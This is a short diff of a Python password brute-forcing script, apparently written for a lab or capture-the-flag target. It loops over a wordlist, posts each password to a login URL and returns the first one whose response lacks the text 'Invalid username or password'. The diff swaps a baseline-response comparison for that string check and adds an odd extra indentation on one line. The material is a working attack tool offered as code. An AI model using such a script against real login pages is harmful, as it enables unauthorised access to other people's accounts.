@@ -57,13 +57,7 @@ def make_pass_call(url, user, password, headers, cookies):
     )
 
 def enumerate_pass(url, user, password_file_list, headers, cookies):
-    demarcation_response = post(
-        url,
-        data={'username': 'obviously_non_existent_user', 'password': 'asdf'},
-        headers=headers,
-        cookies=cookies
-    )
-    with Path(password_file_list).open('r') as file:
+     with Path(password_file_list).open('r') as file:
         for password in file.readlines():
             res = make_pass_call(
                 url,
@@ -72,7 +66,7 @@ def enumerate_pass(url, user, password_file_list, headers, cookies):
                 headers=headers,
                 cookies=cookies
             )
-            if res.text != demarcation_response.text:
+            if 'Invalid username or password' not in res.text:
                 return password.strip()
 
 def main():
